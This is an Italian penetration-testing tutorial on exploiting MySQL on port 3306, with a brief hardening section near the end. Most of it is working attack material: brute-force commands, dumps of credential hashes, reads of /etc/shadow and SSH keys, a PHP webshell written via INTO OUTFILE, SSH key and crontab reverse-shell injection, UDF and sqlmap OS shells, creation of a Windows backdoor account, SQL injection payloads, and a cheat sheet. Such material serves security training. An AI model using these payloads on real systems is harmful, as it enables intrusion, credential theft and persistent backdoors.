---
title: 'MySQL Porta 3306: Dump Database, LOAD_FILE e Webshell via INTO OUTFILE'
slug: porta-3306-mysql
description: >-
  MySQL porta 3306: guida pratica al pentest con brute force credenziali, dump
  database, LOAD_FILE, webshell via INTO OUTFILE, UDF per RCE e tecniche di
  escalation.
image: /3306.webp
draft: false
date: 2026-03-01T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - porta-web
---

# Porta 3306 — MySQL: Dal Login al Root — Ogni Tecnica di Exploitation

MySQL è il database relazionale open source più usato al mondo. Gira sulla porta 3306 TCP ed è il backend di WordPress, Joomla, Drupal, Magento e di milioni di applicazioni web custom. Nel penetration testing, MySQL è un target ad altissima priorità: contiene i dati dell'applicazione (credenziali utenti, dati personali, transazioni), e se raggiungi privilegi elevati puoi leggere file dal filesystem del server, scrivere webshell nella document root e ottenere remote code execution tramite UDF (User Defined Functions). Il percorso tipico in un engagement è: credenziali deboli o trovate in file di configurazione → login → dump dati → file read/write → shell.

MariaDB, il fork più diffuso di MySQL, ascolta sulla stessa porta 3306 e condivide la quasi totalità delle tecniche di exploitation descritte qui. Per il pentester, sono funzionalmente equivalenti.

## 1. Enumerazione

### Nmap

```bash
nmap -sV -p 3306 --script=mysql-info,mysql-enum,mysql-empty-password 10.10.10.40
```

```
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 8.0.35
| mysql-info:
|   Protocol: 10
|   Version: 8.0.35
|   Thread ID: 45
|   Capabilities flags: 65535
|   Auth Plugin Name: caching_sha2_password
|   Salt: random_salt_here
| mysql-empty-password:
|   root has empty password!
```

**Lettura critica:** MySQL 8.0.35 con `caching_sha2_password` (auth plugin moderno). Ma la cosa più importante: `root has empty password!` → accesso root immediato senza password.

### Banner grab manuale

```bash
nc -v 10.10.10.40 3306
```

```
J 8.0.35 xxxxxxxxxxxxxxcaching_sha2_password
```

Il banner rivela versione e auth plugin anche senza client MySQL.

### Verifica se MySQL accetta connessioni remote

MySQL può essere configurato per accettare connessioni solo da localhost (`bind-address = 127.0.0.1`). Se la porta è aperta ma il login fallisce con `Host 'x.x.x.x' is not allowed`, il server accetta connessioni solo da IP specifici.

```bash
mysql -h 10.10.10.40 -u root
```

```
ERROR 1130 (HY000): Host '10.10.10.200' is not allowed to connect to this MySQL server
```

In questo caso, devi prima ottenere accesso locale al server (SSH, webshell) e poi connetterti da localhost.

## 2. Credential Attack

### Default credentials

| Username           | Password                     | Contesto                      |
| ------------------ | ---------------------------- | ----------------------------- |
| `root`             | *(vuota)*                    | Installazione fresh, dev/test |
| `root`             | `root`                       | Setup pigro                   |
| `root`             | `mysql`                      | Pattern comune                |
| `root`             | `password`                   | Pattern comune                |
| `admin`            | `admin`                      | Applicazione custom           |
| `wp_user`          | *(da wp-config.php)*         | WordPress                     |
| `debian-sys-maint` | *(da /etc/mysql/debian.cnf)* | Debian/Ubuntu                 |

Il primo test è sempre `root` senza password:

```bash
mysql -h 10.10.10.40 -u root
```

Se fallisce, prova le combinazioni comuni:

```bash
mysql -h 10.10.10.40 -u root -proot
mysql -h 10.10.10.40 -u root -pmysql
```

### Credenziali da file di configurazione

Se hai già accesso al filesystem (LFI, [NFS](https://hackita.it/articoli/porta-2049-nfs), [iSCSI](https://hackita.it/articoli/porta-3260-iscsi), webshell):

```bash
# WordPress
cat /var/www/html/wp-config.php | grep DB_
```

```php
define('DB_NAME', 'wordpress');
define('DB_USER', 'wp_user');
define('DB_PASSWORD', 'WpDbP@ss2025!');
define('DB_HOST', 'localhost');
```

```bash
# Debian maintenance account (spesso root equivalente)
cat /etc/mysql/debian.cnf
```

```
[client]
user     = debian-sys-maint
password = aB3cD4eF5gH6iJ7k
```

```bash
# .env files (Laravel, Node.js, Django)
find / -name ".env" -exec grep -l "DB_PASSWORD" {} \; 2>/dev/null
```

```bash
# Configurazioni applicative
grep -riE "mysql|jdbc|db_pass" /var/www/ /opt/ /home/ /etc/ 2>/dev/null | grep -iE "password|pass|pwd"
```

### Brute force

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.10.40 mysql
```

```bash
# Metasploit
msf6 > use auxiliary/scanner/mysql/mysql_login
msf6 > set RHOSTS 10.10.10.40
msf6 > set USERNAME root
msf6 > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 > run
```

```bash
# Nmap
nmap -p 3306 --script=mysql-brute --script-args="userdb=users.txt,passdb=passwords.txt" 10.10.10.40
```

## 3. Post-Authentication — Enumerazione Database

### Informazioni di base

```sql
-- Versione
SELECT VERSION();
-- 8.0.35

-- Utente corrente
SELECT CURRENT_USER();
-- root@%

-- Hostname
SELECT @@hostname;
-- db-prod-01

-- Datadir
SELECT @@datadir;
-- /var/lib/mysql/

-- Privilegi
SHOW GRANTS FOR CURRENT_USER();
-- GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION
```

Se vedi `GRANT ALL PRIVILEGES` → hai il massimo dei permessi. Puoi fare tutto.

### Lista database

```sql
SHOW DATABASES;
```

```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress          |
| production         |
| staging            |
+--------------------+
```

### Dump utenti con hash

```sql
SELECT User, Host, authentication_string FROM mysql.user;
```

```
+-----------------+-----------+-------------------------------------------+
| User            | Host      | authentication_string                     |
+-----------------+-----------+-------------------------------------------+
| root            | %         |                                           |
| root            | localhost | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 |
| wp_user         | localhost | *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 |
| app_user        | %         | $A$005$abc...caching_sha2...              |
+-----------------+-----------+-------------------------------------------+
```

**Tipi di hash:**

* `*` prefix → mysql\_native\_password (MySQL 5.x style) → [hashcat](https://hackita.it/articoli/hashcat) mode 300
* `$A$` prefix → caching\_sha2\_password (MySQL 8.x) → hashcat mode 28500
* Vuoto → nessuna password

### Dump dati dell'applicazione

```sql
USE wordpress;
SHOW TABLES;
```

```sql
SELECT user_login, user_pass, user_email FROM wp_users;
```

```
+------------+------------------------------------+------------------+
| user_login | user_pass                          | user_email       |
+------------+------------------------------------+------------------+
| admin      | $P$BgD2E8J5vFN1FH...              | admin@corp.local |
| editor     | $P$B7r2QMN5pK9mJl...              | editor@corp.local|
+------------+------------------------------------+------------------+
```

Hash WordPress (phpass) → hashcat mode 400.

```sql
-- Cerca tabelle con dati sensibili
SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.TABLES
WHERE TABLE_NAME LIKE '%user%' OR TABLE_NAME LIKE '%account%'
   OR TABLE_NAME LIKE '%password%' OR TABLE_NAME LIKE '%credit%'
   OR TABLE_NAME LIKE '%payment%' OR TABLE_NAME LIKE '%token%';
```

## 4. File Read — LOAD\_FILE()

Se hai il privilegio `FILE` (incluso in `ALL PRIVILEGES`):

```sql
SELECT LOAD_FILE('/etc/passwd');
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
admin:x:1001:1001::/home/admin:/bin/bash
```

```sql
SELECT LOAD_FILE('/etc/shadow');
```

Se MySQL gira come root (installazioni vecchie/insicure) → leggi `/etc/shadow` e cracka gli hash.

### File critici da leggere

```sql
-- Credenziali sistema
SELECT LOAD_FILE('/etc/shadow');

-- Chiavi SSH
SELECT LOAD_FILE('/root/.ssh/id_rsa');
SELECT LOAD_FILE('/home/admin/.ssh/id_rsa');

-- Configurazioni web
SELECT LOAD_FILE('/var/www/html/wp-config.php');
SELECT LOAD_FILE('/var/www/html/.env');
SELECT LOAD_FILE('/var/www/html/config.php');

-- Config MySQL
SELECT LOAD_FILE('/etc/mysql/my.cnf');
SELECT LOAD_FILE('/etc/mysql/debian.cnf');

-- Credenziali di altri servizi
SELECT LOAD_FILE('/etc/tomcat9/tomcat-users.xml');
SELECT LOAD_FILE('/opt/app/application.yml');
```

### Limitazioni LOAD\_FILE()

```
- MySQL deve avere il privilegio FILE
- Il file deve essere leggibile dall'utente MySQL (tipicamente 'mysql')
- secure_file_priv limita i path da cui leggere:
  SELECT @@secure_file_priv;
  -- Se vuoto → nessuna restrizione
  -- Se un path → solo file in quel path
  -- Se NULL → LOAD_FILE disabilitato
```

## 5. File Write — INTO OUTFILE → Webshell

Se `secure_file_priv` è vuoto e hai il privilegio `FILE`:

### Webshell PHP

```sql
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/cmd.php';
```

```bash
curl "http://10.10.10.40/cmd.php?c=id"
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE come `www-data`. Per il [privilege escalation](https://hackita.it/articoli/linux-privesc).

### Se non conosci la document root

```sql
-- Cerca la document root nelle variabili
SHOW VARIABLES LIKE '%dir%';

-- O leggi la config di Apache/Nginx
SELECT LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf');
SELECT LOAD_FILE('/etc/nginx/sites-enabled/default');
```

```
DocumentRoot /var/www/html
```

### SSH authorized\_keys

```sql
SELECT '
ssh-rsa AAAA...your_public_key... attacker@kali
' INTO OUTFILE '/root/.ssh/authorized_keys';
```

Se MySQL gira come root → [SSH](https://hackita.it/articoli/ssh) diretto come root.

### Crontab injection

```sql
SELECT '* * * * * root bash -c "bash -i >& /dev/tcp/10.10.10.200/4444 0>&1"
' INTO OUTFILE '/etc/cron.d/backdoor';
```

## 6. UDF — User Defined Functions → RCE Nativo

Le UDF permettono di caricare una libreria shared (.so su Linux, .dll su Windows) che aggiunge funzioni custom a MySQL — inclusa l'esecuzione di comandi OS.

### Linux

```bash
# Trova la shared library UDF (inclusa in sqlmap e metasploit)
locate lib_mysqludf_sys.so
# /usr/share/sqlmap/extra/cloak/lib_mysqludf_sys.so_
```

```sql
-- Verifica plugin dir
SHOW VARIABLES LIKE 'plugin_dir';
-- /usr/lib/mysql/plugin/

-- Metodo 1: LOAD_FILE + INTO DUMPFILE
-- (converti il .so in hex e scrivi nel plugin dir)
-- Più pratico: usa sqlmap --os-shell che automatizza tutto
```

### sqlmap automatizzato

```bash
sqlmap -d "mysql://root:@10.10.10.40:3306/mysql" --os-shell
```

```
os-shell> id
uid=27(mysql) gid=27(mysql) groups=27(mysql)

os-shell> cat /etc/shadow
root:$6$abc$HASH...:19000:0:99999:7:::
```

sqlmap gestisce automaticamente il caricamento della UDF e l'esecuzione dei comandi.

### Metasploit

```
msf6 > use exploit/multi/mysql/mysql_udf_payload
msf6 > set RHOSTS 10.10.10.40
msf6 > set USERNAME root
msf6 > set PASSWORD ""
msf6 > run
```

### Windows

Su Windows, la UDF `lib_mysqludf_sys.dll` permette:

```sql
SELECT sys_exec('whoami');
SELECT sys_exec('net user backdoor P@ss123! /add');
SELECT sys_exec('net localgroup Administrators backdoor /add');
```

## 7. MySQL in SQL Injection (via web app)

Se non hai accesso diretto alla porta 3306 ma hai una [SQL Injection](https://hackita.it/articoli/sql-injection) nell'applicazione web, puoi sfruttarla per accedere al database MySQL e dumpare dati sensibili.\
Per automatizzare completamente l’exploitation e ottenere accesso al database o una shell, puoi usare [sqlmap](https://hackita.it/articoli/sqlmap).

### sqlmap completo

```bash
# Discovery
sqlmap -u "http://10.10.10.40/page?id=1" --dbs
```

```bash
# Dump database
sqlmap -u "http://10.10.10.40/page?id=1" -D wordpress -T wp_users --dump
```

```bash
# File read via SQLi
sqlmap -u "http://10.10.10.40/page?id=1" --file-read="/etc/passwd"
```

```bash
# File write (webshell) via SQLi
sqlmap -u "http://10.10.10.40/page?id=1" --file-write="./cmd.php" --file-dest="/var/www/html/cmd.php"
```

```bash
# OS shell via SQLi (UDF)
sqlmap -u "http://10.10.10.40/page?id=1" --os-shell
```

### Manuale — UNION based

```sql
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4-- -
' UNION SELECT 1,'<?php system($_GET["c"]); ?>',3,4 INTO OUTFILE '/var/www/html/cmd.php'-- -
```

## 8. Privilege Escalation MySQL → System

### Da www-data (webshell) a MySQL root

Se sei www-data tramite webshell e MySQL è su localhost:

```bash
# Usa le credenziali trovate in wp-config.php o .env
mysql -u root -p'Password_From_Config'
```

### Da MySQL root a system root

```
Percorso 1: LOAD_FILE(/etc/shadow) → hashcat → password root → su/SSH
Percorso 2: INTO OUTFILE → webshell → linpeas → privesc
Percorso 3: INTO OUTFILE → crontab injection → reverse shell as root
Percorso 4: INTO OUTFILE → SSH key injection → SSH as root
Percorso 5: UDF → os command → reverse shell as mysql → linpeas → privesc
```

Per la [linux enumeration completa](https://hackita.it/articoli/linux-enumeration) e le [tecniche di privilege escalation](https://hackita.it/articoli/linux-privesc) dopo aver ottenuto una shell.

### Credenziali MySQL → Lateral Movement

Le password trovate nel database vanno testate ovunque (credential reuse):

* [SSH](https://hackita.it/articoli/ssh) sullo stesso server e su altri server
* [SMB](https://hackita.it/articoli/smb) se l'ambiente è Windows/AD
* [RDP](https://hackita.it/articoli/porta-3389-rdp) su workstation
* Web login di altre applicazioni
* [cPanel](https://hackita.it/articoli/porta-2082-cpanel) (le password cPanel e MySQL sono spesso identiche)

## 9. Detection & Hardening

### Blue Team

```
- Monitor login falliti (mysql error log)
- Alert su LOAD_FILE() e INTO OUTFILE in query
- Alert su creazione UDF (CREATE FUNCTION)
- Monitor accessi da IP non autorizzati
- Audit log abilitato (general_log o audit plugin)
```

### Hardening MySQL

```ini
# /etc/mysql/my.cnf

[mysqld]
# Bind solo su localhost (se non serve accesso remoto)
bind-address = 127.0.0.1

# Limita file read/write
secure_file_priv = /tmp

# Disabilita LOCAL INFILE (prevent file read via client)
local-infile = 0

# Password policy forte
validate_password.policy = STRONG
validate_password.length = 12

# Log queries sospette
general_log = ON
general_log_file = /var/log/mysql/general.log
```

* **Rimuovi account anonimi**: `DROP USER ''@'localhost';`
* **Rimuovi test database**: `DROP DATABASE test;`
* **Password forti** per tutti gli utenti, specialmente root
* **Privilegi minimi**: `GRANT SELECT ON wordpress.* TO 'wp_user'@'localhost';` — no `ALL PRIVILEGES`
* **No root remoto**: `DELETE FROM mysql.user WHERE User='root' AND Host!='localhost';`
* **Aggiorna regolarmente**: patch per CVE

## 10. Cheat Sheet Finale

| Azione             | Comando                                                                        |
| ------------------ | ------------------------------------------------------------------------------ |
| Nmap               | `nmap -sV -p 3306 --script=mysql-* target`                                     |
| Connect            | `mysql -h target -u root -p`                                                   |
| Versione           | `SELECT VERSION();`                                                            |
| Lista DB           | `SHOW DATABASES;`                                                              |
| Lista tabelle      | `USE db; SHOW TABLES;`                                                         |
| Dump utenti MySQL  | `SELECT User,Host,authentication_string FROM mysql.user;`                      |
| File read          | `SELECT LOAD_FILE('/etc/passwd');`                                             |
| Webshell write     | `SELECT '<?php system(\$_GET["c"]); ?>' INTO OUTFILE '/var/www/html/cmd.php';` |
| SSH key write      | `SELECT 'ssh-rsa ...' INTO OUTFILE '/root/.ssh/authorized_keys';`              |
| OS shell (sqlmap)  | `sqlmap -d "mysql://root:@target/mysql" --os-shell`                            |
| Brute force        | `hydra -l root -P wordlist target mysql`                                       |
| secure\_file\_priv | `SELECT @@secure_file_priv;`                                                   |
| Plugin dir         | `SHOW VARIABLES LIKE 'plugin_dir';`                                            |
| SQLi → dump        | `sqlmap -u "URL?id=1" -D db -T table --dump`                                   |
| SQLi → shell       | `sqlmap -u "URL?id=1" --os-shell`                                              |

***

## Riferimenti e approfondimenti

Per approfondire la sicurezza di MySQL e le tecniche di test:

* [MySQL Security Guidelines](https://dev.mysql.com/doc/refman/8.4/en/security-guidelines.html)
* [OWASP WSTG — Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
* [HackTricks — Pentesting MySQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql)

Se vuoi continuare a migliorare lato offensivo e imparare queste tecniche sul campo, puoi vedere la [formazione 1:1](https://hackita.it/servizi).

Se invece vuoi testare vulnerabilità reali, validare la sicurezza della tua infrastruttura o formare il team della tua azienda, vai su [Servizi](https://hackita.it/servizi).

Se questo contenuto ti è stato utile e vuoi supportare il progetto HackIta, puoi farlo da [Supporto](https://hackita.it/supporto).
